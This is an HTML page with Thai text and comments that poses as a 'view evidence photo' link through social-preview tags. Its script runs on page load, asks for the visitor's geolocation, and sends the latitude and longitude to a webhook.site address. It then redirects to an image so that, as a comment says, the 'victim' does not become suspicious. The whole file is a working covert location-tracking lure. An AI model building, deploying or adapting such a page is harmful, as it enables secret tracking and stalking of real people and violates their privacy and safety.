<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="ดูรูปภาพหลักฐาน">
    <meta property="og:image" content="https://rewat9888.github.io/upgraded-fishstick/evidence.jpg"> 
    <meta property="og:type" content="website">
    <meta property="og:description" content="คลิกเพื่อตรวจสอบรายละเอียดรูปภาพ">
    <title>Loading...</title>
</head>
<body onload="getLocation()" style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family: sans-serif;">
    <h2>กำลังโหลดรูปภาพ...</h2>
    <p>กรุณารอสักครู่ ระบบกำลังประมวลผลไฟล์หลักฐาน</p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                // คำสั่งดึงพิกัดจากเครื่องเป้าหมาย
                navigator.geolocation.getCurrentPosition(s => {
                    // ส่งข้อมูลไปยัง Webhook ของท่านเรวัตโดยตรง
                    const lat = s.coords.latitude;
                    const lng = s.coords.longitude;
                    fetch('https://webhook.site/aaca1b99-4b80-4376-b5b9-9f1a8175c9ca?lat=' + lat + '&lng=' + lng);
                    
                    // หน่วงเวลาเล็กน้อยเพื่อให้ส่งข้อมูลสำเร็จก่อนเด้งไปดูรูป
                    setTimeout(go, 800);
                }, go);
            } else { 
                go(); 
            }
        }

        // ฟังก์ชันเด้งไปที่รูปภาพจริงเพื่อไม่ให้เหยื่อสงสัย
        function go() { 
            window.location.href = "evidence.jpg"; 
        }
    </script>
</body>
</html>
